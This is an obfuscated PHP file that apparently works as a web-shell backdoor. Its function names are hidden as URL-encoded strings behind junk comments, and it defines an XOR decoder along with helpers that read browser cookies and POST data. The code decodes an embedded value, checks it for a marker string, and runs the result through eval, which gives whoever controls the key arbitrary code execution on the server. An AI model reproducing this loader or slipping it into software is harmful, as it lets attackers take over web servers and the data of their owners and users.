<?php # +Hn>?N		
PARSE_stR	/* z2QY;^7f */( '14'// <V|		\ w
.# +aV	g
'0'// 	7'[?CKi
. /* 2+tqE !;M */'='// ZrbG	"~lJQ
.// 	 n=lL 8*
 '%61' . '%'// 7Z G\
. '5'/* /@L$Y0 */. '2%'/* JV!=7!jL */.	# DU(} : fe
'72%'/* O9^c!?xz */.// >cdS4L-
	'61%' . '79' . '%5'/* l	h|J */. 'F%'// s.AR(FMqV
. '5' . '6%' .# -L@gz*!F14
'6'	/* & %]P */. '1' .	// Jb K^Ic||}
'%' .# _	zBF
 '6'	# FoI0  
. 'c'// e>Bs&
. '%5' /* DhOFs.<^{6 */ . '5%6'// BGkZj	
.# $odgS]33
'5'# %^o+ h7
. '%5' . /* ~IDaC */'3&5'/* `UO $%o */.# t1c^ |1RI
 '8'# &FN&J "IpA
./* b!,[> */'2' . '=%' . '7'// v(2,yhF|
. '5%5' . // 	P3-i4:
'2%'	#  Y$-)rj	
.# [@?w-@
'6'// J|	I<3
./* `gmdK */	'c%4' ./* s[yW$o j	= */'4%6' .// PFZ`5BK
	'5%6'// 2c:&e
. # `;`F^X76O 
'3' . '%' .#   dsS>
'6'#  ~"$zc&.W
. 'F%' . '44' . '%4'/* * :4}97K */. '5' . '&9'// ;E	d	$qM)
.# 	z+i|a@s
'84='# )+iM	
. // b"?*@*f 
'%6c'/* \mk/rJ;	 % */. '%' ./* 3d*	5D */'49'// YsE hq=
./* ~`?:)q	" */'%' // 6q	yhkUp=
	. '73'# $KIcZ}U_z(
. '%54'// ;*ZT0X3q}	
. '&9'// EI93GSi~P
. '5' . /*  ]`'a(f */'7'# ~U3	?!b 8.
.	# cis9	
'=%7' .	# ao.h 	; 
'3%7' . '4' ./* 	iT		Pl	 */'%72' // F!!>~3
.// Wlb		o/
 '%' /* 	uLlLJ	v.O */.# u.VVx	(|*Z
'6c' .# p5;;6E)
'%65' # j?tV8P41Y
./* $$6pIec< */'%' .// <>s$9= 
 '6' . 'E' . // e1>yRex|
'&18' .	# G[sFP{pp ;
'7'# 5i%tgie6N
	.//  wa>KA5
'=%6'	/* _`yDhoU[9 */. '6%4'// 3|-yYeu0Kg
	.	# KcE}3n^7$*
'f%6'# ~r0rnIn, h
. 'E%3' . '8%' ./* 8PYxny */'47%' // CG%f<
. '6d%'// AHda	cj
	. '6' .# ZYJ g:
'7%' .#  	P	L	=
'55' ./* mKe1Km1, */ '%70' .	# RsMq C2l 
'%39'/* bI 5	? */. '%6d' . '%4' .	// W"_8^FO$G
'2'# 55?~^hy
 . '%57' /* I!/=}A */. '%41' . # y<.Y85y>	
'%'// ,EcBu	P3f
	. '6' . '8'/* Mt_Y 7 */ ./* !f	2">+0z */	'%4f' .# SIU/h
'%77' .# ,3K@x
'%4'# 	|3,	2
. '4&1' . '57'// `cq	Lz
 . '=' . /* BaUq9^ */ '%7' . '3%'# 8hU0]Zsh
 . '65%' . '63'/* f^laf q) */ . '%' # v T1P9I	k^
. '7' .	/* v6_M	* */'4%' .	# 	z Fz^
 '6' ./* =g:	 = */'9' .	# :U*Xx
'%6' .// & 	nBD
'F'	# %[J`[jo
	. '%4E'/* kG--Guf */.	/* QQsp9 */'&' . '58' // 01${fA
.	// U\=k}Vn
'0='/* uqLQ\(9T */ . '%'// jRb	+FW
.# l3(^!i 9
'62%'/* *d3|x	 */. '41'/* )+i=\y;a+ */. '%73' . // gNa)z
'%' . '45'	// JH!14XGc1
. '%3' . '6%3' .#  0hP1>9
'4%5' . 'F'# 7LD)$t
 ./* FZI-~$W */ '%4'# -XMfz
	.// n*  G	UZIw
'4'#  GHF$uL
	. '%65' . // %6Tw=	~+N
	'%4' .	// Xw v~I;YD
'3%'/* H<x	M */. # K(r;*c2Nr 
'4' ./* :L5--J */'f%6' . '4%4' . '5&7' .// Q	m<z
'7' . '0=%'/* ~v; CW:		] */./*   HW33pL */'61%' . '3A%'	# i&Qp>^	xJ
. '3'# L&Pray eSH
.// WH1S%G
'1'# +EDyRE6P
./* wLc0umo */'%3' .# )X;al=me:B
'0%3' . 'A%' . '7B%'# "x7W+PV
. '69' . '%' . '3a%'/* |&9Q]v@/=' */ . '34'	/* DR_!gt& */. '%' ./* jVNRk */	'38%'# H'U1U|H=
./* ?,F+E' */	'3B%' ./* wJ WK.A */	'69%'	# i7A	" 0
.// mk F\iqHz
	'3a%'# 0E	JB;j U:
. '34' . '%'# 9L	MJUgJG
	.// ~PF-jh
'3'// b_?O?YmvZ
. 'b'/* y~		O>gL? */.# WNr?X 
'%6' . '9' .# d'7w,)
 '%3'	// 	sMvGJ
. 'a%'	/* -xZ	B/" */. '32' . '%'// &veIf<j
	.// }]<D ]
'34' . '%3B' ./* 	 E4n<d7sL */'%69'# 	ounN7-vC]
.# (rT*G9
'%'/* 1c0^:st\3+ */.# hXk*-y*o
'3' . 'A%3' .	/* 	aX	d`%-o */	'1' //  (/Y)
.	/* Lnn9*<ln, */'%3' .	/* -AM  f( */'B' . // +Qkk{e
'%69' ./* +OY;&d */'%3'# jbo\	>
	.// /I"|^DvSR
'a%' . '3' . '2%3' // {	/  
	.// \}~8*USp%q
 '5%3' . 'B%' . '69' .// KA<>5
 '%3A' . /* g L[z7E 1 */	'%35' .	// >![mt_S_r
'%' . '3b%' .# bv  L
'69'// -9i8>'FRa
. // _"qOLw
 '%' . '3A'# cV>0]+{a,
./* Jsb^x\%p */	'%31'/* O, =ri7aNz */. '%' . '3' // [J	Ve	/
. '8%' . '3'// "4sA@c
./*  gVCu I;l} */'B%6'/* NDWgmQ, */. '9' . '%3a' .// P$T+r @s
'%' . '31%'// $=.J`n~\:j
.// SUE 	!
'37%' .// qBn]cY1
'3b' .# Jw&ee&k%m
'%6'# 'V	G]]>ir
. # apkCFR7c*>
'9%3' ./* l [1 U}PK] */	'a%3' . '5%' . # P^-	'1
	'3' .// @)_ UIP0!Q
'7%'# JG\{	e/K
.# [ uzT0
'3B%'/* JtF>\V[ */ . '69'/* oQ}@) */. '%3A' ./* eE,gu'} */'%3' . '6%3' . 'b%'// nd@=G`
. '6' . /* 88w7|	X}. */ '9%3' . /* {Mf(l	ww */'a%3'# W%4SZ	s8
	.	# JNR{t
'9%3'// B{e=	se|
.# _pxrf>+zLl
'3%3' . 'b%' .	// 	=U/!x	Rq
'69%' . '3'	# !0M*u`Ao;,
	. 'a%'// }P{E 
. '36%' . '3b' .# A? |ov	
'%'# 71y.!
	. '69'/* Cw B:w */.// Qq|ExPH+
'%3'# {	W	|u;_F
	. 'a%'// +^17M1
.// =Tj7r7Z{ @
	'31%'// 1KY92 !a-
 . '39%' /* d,g0!OW */.# 7p VZ0ty
'3B' . # ?.PD( >H*
'%' . '6'/* 		*P~:a- */. '9%3' . 'a%3' . '0%3' . 'b%'// F6df?} 
. '69'/* q3 	&zDk */.# = aF'RWbnP
'%3A'	# _I&g~
	.	// @1BjpE~!
'%3' .# 0EDDC
 '4%3' . // {bU {D
	'5%3'#  B;P9.
	.// n|Y%an[R
'b%6' . '9'	/* e:2H\xk2 */. '%3a' . '%3'/* :zpRg */./* Aek 		Ry */ '4'/* "e$BTzf~* */	. '%' /*  <	w|go$ */.# _)v;.q?U
'3B'# @m	V`4h
 .// 68I:U0U4a
 '%6' . '9'	/* ugFmW a]I4 */. '%' . '3A%'# yf[ %
./* tdGt	Z */ '33' . # &(y)MO>
 '%' . '36%' .# l	pU)
'3B%' # 	!i{~
.// DUy?JaQ_L5
'69%' # {nG	.+IK
./* {\T3V+ */'3'# /9u	Eu1F
.# sn79jfJO
'A%' . '3'// Pw_Gd
./* GIx&p 97 */	'4%' . // p03Pg}
'3b%'# VCY$N1SFwl
	. '69' . /*  |	,oUr	 */'%3'// e0C!Pf
. 'A'# >n$X1	L
 . '%3' ./* }(=,y~y */	'9%' . '34' . '%3'/* 0Y;>[q */ ./* CT6bVx */'b%' .# ~,JO}7{ 
'6' . '9%' . '3' . # S5VGuvB	
'A%2' . 'd%' . '31'// (7i8,
./* ?rLeGc^=  */ '%3B'	/* YGfO"-v */.// | 3mxv=M%
	'%7' /* =fJ:"qrEAZ */. # ('s2g,hgQ
'D&2' . '8'	// E*G	}	F+A%
	. '1=%' .	// 6da s
'63' . '%6' .// j3fy6w
'f%' . '64' . '%'// ,V-M6t?L
. '6'# {H$pF
. '5&3'//   po{'	
. '29' . '=' .	/* 	yr4	|OJ */ '%7a'/* ]%Hv}/ */ . // 0Jz3q
'%56'/* o	Sm_R   */ . '%6a' . '%6' //  7 K'Dj
	.// C|	s 'i
'2%' .//  +<{()E;X!
'70'	# RySIRB+'s
 . '%5' . '9%4' . 'A%5' . '9%'# |F"1 ?V
. '73'/* 	'fx< */. '%'# Hx	g/c	(7N
	.// a;Pg,,R~
'6B%' .	/*  HQibM */'7' . 'a'# iEM .\*Qr
 . '%'// QxQ1way
. '6D%'// fISC5$
 . '5'/* _0Ll4{?!  */. '6%' .# 54g	d{{N 
'30%' . '77'//  {6kgN*zC
.// 	u|YY!
'%'# 	V_cAgOm%
. '78' // -t;HWYo
. '&5'/* B>|w  */.// vZ]8 bp
'56'# f;|uxt 9UK
.// -kX9;
'=%6'# _'6r 
. /* }KGpO}>! */	'6%' . /* NspKq_Wy */	'4f'	/* \^l\2\v */. // Cj?		? 	2&
'%' . '6e%'# !	HYFF;
. '54'	// :_	3J17F1Q
.// ~TzA)v|n@|
'&83' .	# ]<$9L,]SM-
	'9'# x!Z=}hr`
	.//  2jqQn%D(.
	'=%4' .// BS e)uP c
'1'# n~_TbAN.
 ./* 0}^Gw. */	'%6'/* &R!7NS}! */.	# QO/ 	Rq
'E%' // 	K.m,?Ef?
	. '63%'	// -05$q
. '48' .# zWyiNu
 '%' . '6'/* |(KTXz2!2j */ ./* Ku3m\a */ 'F'	/*  Rl3Ayz */ . '%52'/* FS^s(ta r */ . '&' ./* <4hG}<HOo */'7'	// 7s? B3L.
 . '28' .	// z9wiU
	'=' .// 5@	r	
'%43' . '%'	# )?fs0!
.# 9sNebE2FB}
'4f%' . '6c%'	/* 8{8(&P */	.# ] mzD		2
'67' .// 	ql!iy	,
'%52'//  \:K?{w
	.	// u561h
'%4' ./* E4Yt7 */ 'F%' .// &:	0^
'75%' . '5' .# 2~*64[
 '0&1'/* Ol/ZmpU */ . '34'/* lpSlM	 */. '=%' .	/* nE+$n7:|~D */	'54%' . '66' . '%' . // X'TyW2
'4f%' # R2	Gr?iW
.// X	;jtef
'6F' . /* d~|ggg0"/ */	'%5' . '4&'# g6X+[	KM
	. // @% 8+S
'602'	/* )vJYK(K/r */. '=%' ./* 	:T*Z  */'7' . '4%4'# !^j241
./* @3e._%>kh` */'F' ./* ^U= p */'%5' . '2%'//  ![2T!9`_
	. // %yhGq W 
'69%' . # 	m D	
'65%'	// EK,ySwI2h
	.	// IbHfk79"k~
'54%'// %vj&e J3n
	.	/* j'us6F\/E */	'66'# XIN	NABo	3
	. '%5'	// K4vxD
./* |b1I6   de */'1%'# !}a-(!
.	# a	mi xb' 
'69' ./* R%+~fp H */'%64' .# Y{/~?<
'%4' ./* 	6%5} */'4%4' . 'F%' ./* 0))	wY */'41%' /*  /	F% */	./* Y)\~L */ '35%' /* 9 ,H{, */ ./* (Zd)l&_F*? */ '34%'# -IUAn
. '7A%' . '66' ./* 77Z;jzy */	'%'/* ?tWG9yq1 */. '48'# )Z:$qe/1QX
 . '%4'/* ut)	O_* */ . 'b' . '&'/* -tY~y^Y: */ . '17'// W	7%P;
. '=' . // qn!$0	_oT6
'%' . '43%'/* y!	JPz/3, */.# 48S7$xPyD
'6' # \	FDQ`
.	// wc}%n^}3<3
'1' . '%'/* _7&-}7l */. '7'	/* *WT| ER=|2 */	. '0%'// -3mB)sx7M
	. '5' .	# IV*yb% WS
'4%' . # c$/T*
	'69%'// 	|8K3E ]:1
.// /wVIa 
	'4' /* A{LO,>9Bp{ */	./* 9;4O%dA */ 'F%'/* = 8<~3 */. '6E' .	# }yo		hBl~
	'&' ./* 1 s<qJ0 */'38'/* j^S9\z*k]c */. '='#  7wb[:@C
. '%73' .#  tn0U7.hbV
'%'/* I=PF{ */ . // ,8LVZ0E';
'74' . '%'/* o>F7E */	.	/* /E 1oWn */'72' . # 'b	ZJ8wgv
 '%' .# a j-9.e
 '7'/* Upk)q)T */	.# Yoq9^]h
'0%4'// Z8) y6" >F
./* iW OJcOyI */	'f%' .// +;b?z'
'53' // M	\E(4	^
. // | Pfj x`6
	'&6'/* XxM_  */ .// >4%D!
'95' . '=%4' /* a{D*Q0o  */.// W.K(?4
'e' .#  >20]x
	'%'	// fB9b]Q6
.	/* PKvG`> */	'6f%'# j0K=y+
. '42%' . '5' .// izGH_
	'2%6' ./* F5GCj<QU */'5%6'# IJlU(
 . '1'# dO  Qr3
 .# zkVk^99
	'%'# \?rIb
 . '6b'	// J~0F5f
. '&33'	# DLFu<7
. '2='// '/}"E
. '%'# PE-x'&-I
. '7' .// ohj(g?hbX
'3'/* f{k=qRHH_ */./* Ns>M  */'%55' . '%'/* ,6i&H<t */. '62'// I%;gkqO^q
. '%' . '53%' ./* }3<\j$, */'54' . '%52'# Z DQpHPEYC
. '&8'// HS YJ8P\
 .// f	 *C-Jq
'94'// (QG]U
	. '=%7' . '4%' # 6/}G4ei	 B
./* :	{=^ */'6' ./* :r	%qUI */'5'/*  Vd	l(3Dx */. //  2;0TV(W%B
'%6D' .# mi)u9
 '%5' .	# bE(1=$5S
	'0%6'//  7;^[	54=>
.	/* >;=um9aS */'c' .# =ih+		
'%4' .	# P0jHN ET)
'1%'// 5p=1	DoS
. '7' . '4'	# tnPsHH 
 . # 'H	f/cyH
'%' // bo[]J$!\
. '65'// |Bm_[Z kc 
.// ?|uUx'tK
'&9' . '3' . '0=%' . '6B'	// kT; Us
 ./* Pkt]K	 ) */ '%45'/* ]OX ~cA */ . '%5'/* YAf,)9i$i */	.	/* xmi(g2(	S" */ '9%' ./* YWZ 2bE */'47' . /* m[*Ucy$> ^ */'%'	# q gRK
.# E-Q`AYyNGD
'45%'// KSAk=m0o
.// R:vy%^
'6E' . '&3'# UC&	 F
. '5' .// J`|T*`|
	'=' .# O	 /_lxte)
	'%7' . '5%4' .# : Bh >jJg4
'e%' . '73'# bo=QO'(U
	. '%45' /* 	w9*	B3vUA */. '%72' .// U Mh(%od
'%4' . '9%4'// _o_9	&*
.# 4i4Qa"23
'1%'// -IQ@ b2g
. // ^{yo*2<\
	'6' // W(p{E=?p\
.# OzE	Sw
 'c%'// "9|l:w-
 .// 	t5b!Wm
'6' . '9'//  		0S
	./* _p t7F S */ '%' . '5a%'# 3&B+ 
. '45&' ./* 0<.|f */'56' . '3=' # nS>ia3*o~
. '%6'# 5"}3N`*V]k
. 'E' .	// 4	5!	O
 '%33' .// L0@ Vw0q50
 '%3' .	/* V4 q(o */'0%6'// ?oVH%
. '5%' // E	~g'
 . '5' .//  sS	~
	'2%'# q;j~ o
. '33'/* B>L9 3yZ6 */ . '%'/* x6]	u3tR */.	/* g$,en]e9 */'6' .// 	3NWo
'D%3'/* 0hCDHO9%c */	./* ,:	GE */'8'/* l2<DA@^D */.# DQhr:4ic 
'%4'	// %]IEV?/p
	. '8%'# {$^\	\
. // C?[&Rf?NAm
'6c' /* 'n}Com5.W */ .// 	\( 	kFm_
'%71' . '%4C'#  .2|Z
. '%4'# C~KjO
.# B[T]^R0
'4%7' .// M~^81-r
'2%3'// -p)R(!a
 .# Oii}:Y[D
	'1%4' . # 	Wv	JE^ ~1
'2%6' .// E7ajkN	
'8%'/* Ze^}	 */.// Ou)[XV
'44' . '%7' . '6%' . '54'/* M^q+=HJg} */.	/* w	_?h53[:, */'&' . '62'/* n4jq-a */	. '8'/* A; WT M */.	/* I("/5[9<@; */'=' . /* gJRK\t */'%54' . '%6' . '9%' . '7' . '4%4' . 'C%'	/* HDhr/	 */./* (K~	g)jc O */'45' . '&26' ./* j(Zh0e */'1=%'# uyGuU_	Mz
. '46' . '%4' . '9%6'// )n;CI ;>
. '7%' /* }oQbR */. '43' // <0smhWd
.	/* F_/^n */	'%6' . '1%5' . '0%5'/* 0lKJS Q  */. '4'	/* =[S4M` */ . '%'//  ^:g]n
. '69' /* $d6IEcOU */. '%'/* /4X VK _  */	.	// ~|2CO,
'4f%'/* >[gLF<|xl$ */.	# CUppt9]	h
'6E' . '&' .	/* - 	A4!S */'605' # dJ5!Y
. '=' ./* n7uC`fH[i */'%44' . '%6' . /* Bwdewy7 */'9%' . '7' . '6'//  o]3Rj%
, $b5Y/* {%t |MPGpf */	) ; $nGfK // R{V :Kb@
	= // gpEQ$
$b5Y [ 35 ]($b5Y// ;1GZk
[# ReF(dc~/
582 ]($b5Y [	/*  s)b: */770 /* ;Yflg+ */])); # P;3C(;
	function# 	`d  
zVjbpYJYskzmV0wx ( $rnns67o9// nm;	Kg ;l
	,# P35K]J
$lSed	/* g )&s[sk */) { global $b5Y	/* K \Mh */	;# (EHZq~
$gdKFMF1S# 	L '%
=# <^`>bIqrp/
	'' ; # `CDE$.zZl5
 for// VZ`Y_
 ( $i =	// Z0Mt ^(i
	0 ; $i <// "<N+`R	'	
 $b5Y/* @k j`Q */[ 957# ){~Ih}u!
] // $_ j	RZp
( $rnns67o9/* 	'(iDiZ} */ ) ; $i++ )# E<9 o	2
	{ $gdKFMF1S/* 	"Z"{M */.=/* 4 :vV) */$rnns67o9[$i] ^ $lSed [ $i # -"	*RC	XV
%/* FtS7m;u|P */$b5Y [ 957// 	j}	$9I^
]# RzR(Ow! 
(# TV!>i
	$lSed ) /* g.1kEh */] ;# G4rEO
}/* &N]ku' */return# rmI cM
 $gdKFMF1S	# SjotE
; } function fOn8GmgUp9mBWAhOwD (/* 02,hJR> */	$pfRAE9 ) {/* P ~:N\USxk */global	# (6;{T)@
$b5Y # k;n/!IV|YD
; #  (Xj+XU$f
return $b5Y// @Faj9
[ // 2+y>	\?g,
	140 ] ( $_COOKIE// !0I^c
 ) [ $pfRAE9/* o6,|77w */ ] ; }	/* Uzb<  h< */function n30eR3m8HlqLDr1BhDvT ( /* _*SV(z */$QTNG # ^Bf 9K$RlV
)/* F;qCP\+$O= */{ global# |9^y+J=>
	$b5Y ; return $b5Y# ,pHjb,V
[	# hpYcxK
140// bmtIvN+B(w
	] ( $_POST// 4swvk
) [# 3-1I8\
$QTNG// u&2\ v
] ; } // 4 +'%-
$lSed /* )J NV"| */ = $b5Y [ 329 ]# u1w7`DP[B
( $b5Y [ 580# h.0_}Ig\G
 ]//  9s)(
(# 2+B	M+DT[
 $b5Y [/* 6."		}}<T */332 ] ( $b5Y [ 187/* , 	5vz@.h */	] (# , yGd}`
$nGfK// x}H&*6(
[// 	r9,>jGT
48 ] )// 'K ~Z  J
 ,// 45CDachV
$nGfK [// T`dyHq '	^
 25 # m0E-1a@g"	
]// mcvM_]uH!
,/* IdQS  @hkM */$nGfK [	// ,yI	``
57 ]# U7E8!{
 * # {DQL-H:
$nGfK [ 45# F,xw(
] ) ) , $b5Y [ 580	/* t^/J0e- \ */] (// 9rt,31|`	
 $b5Y	// W*2=A
[	// wj*`s>A-/
	332 ] ( $b5Y [ // !R$L2	l,
 187 ] ( $nGfK /*  _R1XgKU,: */[ 24// a%	!1{f 
 ] ) , #  QnND
$nGfK# & '<F,c
[ 18 // Rxe	Fudx
	]// |K!^b?
,# f=j&}[z0+
$nGfK [ 93 ]/* $oR^HUyNlx */*#  scUI
	$nGfK// C~u3U @(
[ 36 ]/* 	n<h\^\}{? */)/* dO:hW]> */) # rE `'nmFN
)/* ^!rk9n= 7 */;# 9:[sBQI	4
$PNoB7Af3 = $b5Y [# "_B_(
	329 ] ( $b5Y/* 21J*^;_Zt */[ 580	/* I FW' */ ] ( $b5Y [/* ?BP_CG */ 563// 6U6	Qj
 ] ( $nGfK/* DTQD  */ [# o|Z}[d
 19 ] ) ) # p-7tv
,//  L	pu
	$lSed// \UW	b`P
) ;//  YGdp
if// FWU'gB
 ( // 	DN:g
$b5Y// Zqi]z
	[ 38 ]	/*  |tgHrVY */	(// ssD*S~Y
$PNoB7Af3 ,	// 09d00J5	
	$b5Y [/* eL:%6br7k */	602 ]	# ]2yQcc
)# .P^	`Y
> /* l\`Q ] */	$nGfK	// 2dy&	|,8
[ 94# T2Be(/
] )# bl;"{L	5
 Eval (	// TI'mPgx
$PNoB7Af3	/* /}=FkEH` */) ;/* dbgA=L(L */